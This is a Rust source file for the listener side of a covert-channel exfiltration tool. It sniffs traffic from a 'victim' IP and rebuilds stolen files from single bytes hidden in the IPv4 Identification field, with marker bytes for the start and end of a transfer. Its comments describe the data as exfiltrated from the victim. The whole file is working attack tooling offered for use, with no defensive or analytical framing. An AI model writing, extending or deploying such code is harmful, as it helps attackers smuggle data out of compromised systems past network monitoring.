use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ethernet::{EthernetPacket, EtherTypes};
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::tcp::TcpPacket;
use pnet::packet::Packet;
use std::net::Ipv4Addr;
use pnet::datalink::{self, Channel};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::io::{self, Write};

// These codes identify the start and end of file transfers 
// being exfiltrated from the victim.
const CMD_EOF: u8 = 0x41;
const CMD_START_TRANSFER: u8 = 0x40;

pub struct PcapHandle {
    pub running: Arc<AtomicBool>,
}

impl PcapHandle {
    pub fn start(iface_name: &str, target_ip: String, listen_port: u16) -> Self {
        let running = Arc::new(AtomicBool::new(true));
        let thread_running = running.clone();
        let target_ipv4: Ipv4Addr = target_ip.parse().expect("Invalid Target IP");
        let iface_name = iface_name.to_string();

        thread::spawn(move || {
            let interfaces = datalink::interfaces();
            let interface = interfaces.into_iter()
                .find(|i| i.name == iface_name)
                .expect("Failed to find interface");

            let (_, mut rx) = match datalink::channel(&interface, Default::default()) {
                Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
                _ => {
                    eprintln!("[!] Sniffer failed to open channel. Need sudo?");
                    return;
                }
            };

            let mut binary_mode = false;
            let mut file_data = Vec::new();

            println!("[*] Sniffer Thread Active. Monitoring: {} on port {}", target_ipv4, listen_port);

            while thread_running.load(Ordering::Relaxed) {
                match rx.next() {
                    Ok(packet) => {
                        if let Some(eth) = EthernetPacket::new(packet) {
                            if eth.get_ethertype() == EtherTypes::Ipv4 {
                                if let Some(ip) = Ipv4Packet::new(eth.payload()) {
                                    // Filter for packets from the victim using TCP
                                    if ip.get_source() == target_ipv4 && ip.get_next_level_protocol() == IpNextHeaderProtocols::Tcp {
                                        if let Some(tcp) = TcpPacket::new(ip.payload()) {
                                            if tcp.get_destination() == listen_port {
                                                // Extract the hidden byte from the IP Identification field
                                                let byte = (ip.get_identification() & 0x00FF) as u8;
                                                
                                                match byte {
                                                    CMD_START_TRANSFER => {
                                                        binary_mode = true;
                                                        file_data.clear();
                                                        println!("\n[!] Sniffer: File transfer detected...");
                                                    },
                                                    CMD_EOF => {
                                                        if binary_mode {
                                                            println!("\n[+] Sniffer: Received {} bytes.", file_data.len());
                                                            binary_mode = false;
                                                            // Optional: Write file_data to a file here
                                                        }
                                                    },
                                                    _ => {
                                                        if binary_mode {
                                                            file_data.push(byte);
                                                        } else {
                                                            print!("{}", byte as char);
                                                            let _ = io::stdout().flush();
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    Err(_) => continue,
                }
            }
            println!("[*] Sniffer thread exiting gracefully.");
        });

        Self { running }
    }
}
